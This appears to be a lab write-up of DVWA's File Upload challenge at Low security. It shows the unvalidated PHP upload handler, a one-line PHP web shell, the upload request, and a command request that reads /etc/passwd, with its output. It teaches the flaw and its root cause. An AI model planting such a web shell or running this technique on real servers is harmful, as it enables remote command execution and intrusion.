# File Upload — Low

## Overview

The Low security level of DVWA contains an unrestricted file upload vulnerability. The application does not validate uploaded files, allowing an attacker to upload a PHP script and execute system commands through it.

## Source Code Analysis

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}

?>
```

The application:

- Uses the original filename to construct the destination path.
- Moves the uploaded file directly into `hackable/uploads/`.
- Does not perform file extension, MIME type, or content validation.

## Exploitation

### 1. Creating a PHP Web Shell

Create a PHP file named `exploit.php` containing:

```php
<?php
    system($_GET['cmd']);
?>
```

The script uses `system()` to execute commands received through the `cmd` GET parameter.

### 2. Uploading the Web Shell

Intercept the upload request using Burp Suite and submit the PHP file.

**Request:**

```http
POST /vulnerabilities/upload/ HTTP/1.1
Content-Type: multipart/form-data; boundary=...

Content-Disposition: form-data; name="uploaded"; filename="exploit.php"
Content-Type: application/x-php

<?php
    system($_GET['cmd']);
?>
```

**Response:**

```http
HTTP/1.1 200 OK
```

```html
<pre>../../hackable/uploads/exploit.php succesfully uploaded!</pre>
```

The application accepted the PHP file and stored it in the uploads directory.

### 3. Executing System Commands

Access the uploaded PHP file and pass a command through the `cmd` parameter.

**Request:**

```http
GET /hackable/uploads/exploit.php?cmd=cat+/etc/passwd HTTP/1.1
```

**Response:**

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

The server executed the supplied command and returned the contents of `/etc/passwd`, confirming successful remote command execution.

## Root Cause

The vulnerability exists because the application:

- Does not validate uploaded file extensions.
- Does not validate MIME types or file contents.
- Stores uploaded files in a web-accessible directory.
- Allows uploaded PHP files to be executed by the server.

## Impact

An attacker can upload a malicious PHP script and execute operating system commands through it.

The commands execute with the privileges of the web server process, not necessarily with root privileges.

## Conclusion

The Low security level demonstrates how unrestricted file uploads can lead to Remote Code Execution (RCE) when uploaded scripts are stored in a web-accessible directory where server-side execution is enabled.
